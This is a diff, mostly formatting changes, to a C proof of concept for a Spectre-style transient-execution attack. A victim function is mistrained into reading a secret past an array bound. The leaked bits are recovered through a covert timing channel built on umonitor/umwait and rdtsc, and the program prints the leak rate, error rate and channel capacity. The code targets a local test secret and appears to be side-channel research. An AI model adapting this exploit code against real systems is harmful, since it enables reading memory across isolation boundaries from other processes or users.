@@ -18,18 +18,17 @@
 
 #define OFFSET (4096)
 
-//#define mytime(x) (rdtsc())
+// #define mytime(x) (rdtsc())
 #define ftime time
 
-
-
-void prepare() {
-  uint16_t value=1;
+void prepare()
+{
+  uint16_t value = 1;
   __asm__ volatile("mov %0, %%gs" : : "r"(value));
 }
 
-
-uint16_t check() {
+uint16_t check()
+{
   uint16_t value;
   __asm__ volatile("mov %%gs, %0" : "=r"(value));
   return value;
@@ -39,14 +38,12 @@ unsigned long long reth1;
 unsigned long long retl0;
 
 unsigned long long mytime()
-    {
-        __asm__ __volatile__(
-        "rdtsc" :
-        "=d" (reth1),
-        "=a" (retl0)
-        );
-        return ((reth1 << 32)|(retl0));
-    }
+{
+  __asm__ __volatile__(
+      "rdtsc" : "=d"(reth1),
+                "=a"(retl0));
+  return ((reth1 << 32) | (retl0));
+}
 volatile int running = 1;
 
 volatile unsigned int array1_size = 16;
@@ -60,25 +57,28 @@ volatile uint8_t temp = 0;
 
 char secret[] = {0, 1, 1, 0, 0, 1, 0, 1};
 
-void __attribute__((noinline)) victim_function(size_t x) {
-  if (x < array1_size) {
-    temp &= test[array1[x]*4096];
+void __attribute__((noinline)) victim_function(size_t x)
+{
+  if (x < array1_size)
+  {
+    temp &= test[array1[x] * 4096];
   }
 }
 
-void leakBit(size_t target_addr) {
+void leakBit(size_t target_addr)
+{
   int tries = 0, i, j, k, mix_i;
   size_t training_x, x;
   /* 16 loops: 5 training runs (x=training_x) per attack run (x=target_addr) */
   training_x = 0; // tries % array1_size;
-  for (j = 17; j >= 0; j--) {
+  for (j = 17; j >= 0; j--)
+  {
     flush((unsigned int *)&array1_size);
     asm volatile("mfence");
 
     x = ((j % 6) - 1) & ~0xFFFF;
     x = (x | (x >> 16));
     x = training_x ^ (x & (target_addr ^ training_x));
-     
 
     asm volatile("mfence");
 
@@ -86,7 +86,8 @@ void leakBit(size_t target_addr) {
   }
 }
 
-void pin_to_core(int core) {
+void pin_to_core(int core)
+{
   cpu_set_t cpuset;
   pthread_t thread;
 
@@ -103,18 +104,20 @@ volatile size_t cnt = 0, cnt_carry = 0, wait_write = 0, writes = 0;
 
 volatile int lbit = 0;
 
-void *leak_thread(void *dummy) {
+void *leak_thread(void *dummy)
+{
   pin_to_core(CORE_ATTACKER);
   test[OFFSET] = 1;
   size_t target_addr = (size_t)(secret - (char *)array1);
 
-
-  while (1) {
+  while (1)
+  {
     asm volatile("mfence");
-    while (1) {
+    while (1)
+    {
       while (wait_write)
         ;
-     
+
       leakBit(target_addr + lbit);
       writes++;
       wait_write = 1;
@@ -124,12 +127,14 @@ void *leak_thread(void *dummy) {
   }
 }
 
-double channel_capacity(size_t C, double p) {
+double channel_capacity(size_t C, double p)
+{
   return C *
          (1.0 + ((1.0 - p) * (log(1.0 - p) / log(2)) + p * (log(p) / log(2))));
 }
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[])
+{
   pthread_t p;
   pthread_create(&p, NULL, leak_thread, NULL);
   sched_yield();
@@ -138,7 +143,7 @@ int main(int argc, char *argv[]) {
 
   memset(test, 1, sizeof(test));
 
-  int bits_leaked = 0, bits_correct = 0,seg=0,inter=0,inter_err=0;
+  int bits_leaked = 0, bits_correct = 0, seg = 0, inter = 0, inter_err = 0;
 
   int timeout = -1;
   if (argc > 1)
@@ -150,13 +155,14 @@ int main(int argc, char *argv[]) {
   start = ftime(NULL);
   int last_delta = 0;
 
-  while (1) {
+  while (1)
+  {
     prepare();
-    for(int i=0;i<2;i++)
+    for (int i = 0; i < 2; i++)
     {
-      flush(&test[i*OFFSET]);
+      flush(&test[i * OFFSET]);
     }
-    asm volatile("umonitor %%rax" : : "a"(test + OFFSET*1), "c"(0), "d"(0));
+    asm volatile("umonitor %%rax" : : "a"(test + OFFSET * 1), "c"(0), "d"(0));
     size_t carry = 0;
     wait_write = 0;
     asm volatile("xor %%rbx, %%rbx; umwait %%rcx; jnc 1f; inc %%rbx; 1: nop"
@@ -165,31 +171,33 @@ int main(int argc, char *argv[]) {
                  : "memory");
     cnt_carry += carry;
     cnt++;
-    seg=check();
+    seg = check();
     while (!wait_write)
       ;
 
-    if (cnt == 1) {
-     if(seg==0){
-	inter++;
-
-     }
-     if(seg==0 & cnt_carry==secret[lbit])
-     {
-	inter_err++;
-     }
+    if (cnt == 1)
+    {
+      if (seg == 0)
+      {
+        inter++;
+      }
+      if (seg == 0 & cnt_carry == secret[lbit])
+      {
+        inter_err++;
+      }
       bits_leaked++;
-      if ( !cnt_carry == secret[lbit])
+      if (!cnt_carry == secret[lbit])
         bits_correct++;
       int current = ftime(NULL);
       int delta = current - start;
       if (!delta)
         delta = 1;
 
-      if (delta != last_delta) {
+      if (delta != last_delta)
+      {
         int speed = bits_leaked / delta;
         double err = ((double)(bits_leaked - bits_correct) / bits_leaked);
-	double err2 =((double)(bits_leaked -inter_err-bits_correct)/(bits_leaked-inter));
+        double err2 = ((double)(bits_leaked - inter_err - bits_correct) / (bits_leaked - inter));
         printf(
             "%.3f%% error [%d leaked, %d s -> %d bits/s] - TC: %.1f bits/s\n",
             err * 100.0, bits_leaked, delta, speed,
@@ -197,9 +205,10 @@ int main(int argc, char *argv[]) {
         fflush(stdout);
         last_delta = delta;
         timeout--;
-        if (timeout == 0) {
+        if (timeout == 0)
+        {
           printf("%.3f,%d,%.1f,irq=%d\n,after_filter:%.3f\n", err * 100.0, speed,
-                 channel_capacity(speed, err),inter,err2*100);
+                 channel_capacity(speed, err), inter, err2 * 100);
           exit(0);
         }
       }
